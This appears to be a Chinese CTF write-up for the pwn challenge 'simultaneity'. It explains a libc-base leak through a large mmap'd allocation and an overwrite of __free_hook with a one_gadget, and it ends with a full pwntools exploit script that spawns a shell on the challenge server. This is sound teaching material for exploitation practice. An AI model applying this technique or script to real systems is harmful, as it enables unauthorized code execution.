# simultaneity 15
>题目好难，按照题解的思路完成，增加了细节补充

题目先允许我们申请一块自定义地址大小的内存，然后读入一个偏移，内存+偏移的位置写8字节指定内容。  
二进制文件保护除了Canary全开，但是交互结尾的exit(0)也避免了简单的栈溢出，FULL RELO情况下不能打exit的got。  

在程序启动时，libc会给程序分配一块内存空间供简单申请使用，当申请的内存超过这块空间的大小但又不超过大堆的大小时（不同libc版本大小不同，在.so.6一个有效的大小是10001000）时，就会mmap到与libc对齐的一个大堆上，通过这个特性可以打出libc的基址：
>10001000  
you are here: 0x7f5a3951b010  
gdb-peda$ vmmap  
Start              End                Perm      Name  
0x000055a8c3780000 0x000055a8c3781000 r--p      /home/REDACTED/Desktop/simultaneity  
0x000055a8c3781000 0x000055a8c3782000 r-xp      /home/REDACTED/Desktop/simultaneity  
0x000055a8c3782000 0x000055a8c3783000 r--p      /home/REDACTED/Desktop/simultaneity  
0x000055a8c3783000 0x000055a8c3784000 r--p      /home/REDACTED/Desktop/simultaneity  
0x000055a8c3784000 0x000055a8c3785000 rw-p      /home/REDACTED/Desktop/simultaneity  
0x000055a8c3a9b000 0x000055a8c3abc000 rw-p      [heap]   
**0x00007f1c7638f000 0x00007f1c76d19000 rw-p      mapped** //我们申请的地址在这里  
0x00007f1c76d19000 0x00007f1c76d3e000 r--p      /usr/lib/x86_64-linux-gnu/libc-2.31.so  
0x00007f1c76d3e000 0x00007f1c76e89000 r-xp      /usr/lib/x86_64-linux-gnu/libc-2.31.so  
0x00007f1c76e89000 0x00007f1c76ed3000 r--p      /usr/lib/x86_64-linux-gnu/libc-2.31.so  
0x00007f1c76ed3000 0x00007f1c76ed4000 ---p      /usr/lib/x86_64-linux-gnu/libc-2.31.so  
0x00007f1c76ed4000 0x00007f1c76ed7000 r--p      /usr/lib/x86_64-linux-gnu/libc-2.31.so  
0x00007f1c76ed7000 0x00007f1c76eda000 rw-p      /usr/lib/x86_64-linux-gnu/libc-2.31.so  
0x00007f1c76eda000 0x00007f1c76ee0000 rw-p      mapped  
0x00007f1c76ef8000 0x00007f1c76ef9000 r--p      /usr/lib/x86_64-linux-gnu/ld-2.31.so  
0x00007f1c76ef9000 0x00007f1c76f19000 r-xp      /usr/lib/x86_64-linux-gnu/ld-2.31.so  
0x00007f1c76f19000 0x00007f1c76f21000 r--p      /usr/lib/x86_64-linux-gnu/ld-2.31.so  
0x00007f1c76f22000 0x00007f1c76f23000 r--p      /usr/lib/x86_64-linux-gnu/ld-2.31.so  
0x00007f1c76f23000 0x00007f1c76f24000 rw-p      /usr/lib/x86_64-linux-gnu/ld-2.31.so  
0x00007f1c76f24000 0x00007f1c76f25000 rw-p      mapped  
0x00007ffdee798000 0x00007ffdee7b9000 rw-p      [stack]  
0x00007ffdee7d3000 0x00007ffdee7d7000 r--p      [vvar]  
0x00007ffdee7d7000 0x00007ffdee7d9000 r-xp      [vdso]  

用libc的起始地址减去我们申请到的起始地址，得到固定的偏移  
0x00007f1c76d19000 - 0x7f1c7638f010 = 10002416  

所以libc基址 = 申请到的地址+固定偏移  
这样就可以在ASLR开启的情况下计算出libc的基址，也就可以计算出__free_hook相对我们申请到的地址的偏移  

在读入数字时，我们可以添加大量前导零，迫使libc发起malloc，当成功读入数字后，系统会经由__free_hook调用free，这时候就会执行freehook地址中的指针指向的指令。  
我们可以修改8字节的内容，虽然不能完成system的ROP，但是在知道libc基址的情况下可以直接跳转到一个可用的gedget（就是一个现有的system("/bin/sh")地址），通过one_gadget查看可能可用的gedget：  
>$ one_gadget libc.so.6   
0x4484f execve("/bin/sh", rsp+0x30, environ)  
constraints:  
  rax == NULL  
>
>0x448a3 execve("/bin/sh", rsp+0x30, environ)  
constraints:  
  [rsp+0x30] == NULL  
>
>0xe5456 execve("/bin/sh", rsp+0x60, environ)  
constraints:  
  [rsp+0x60] == NULL  

找到三个gedget，经测试，后两个都满足可用条件。  

综上，利用脚本如下：
```python
from pwn import *

libc = ELF('libc.so.6')
binary = context.binary = ELF('simultaneity')

p = remote('mc.ax', 31547)
libc.symbols['gadget'] = [0x4484f, 0x448a3, 0xe5456][1]
p.sendlineafter(b'big?\n', b'10001000')
p.recvuntil(b'here: ')
libc.address = int(p.recvline().strip(), 16) + 10002416
p.sendlineafter(b'far?\n', str((libc.sym.__free_hook - libc.address + 10002416) // 8).encode())
p.sendlineafter(b'what?\n', 65536 * b'0' + str(libc.symbols['gadget']).encode())
p.interactive()
```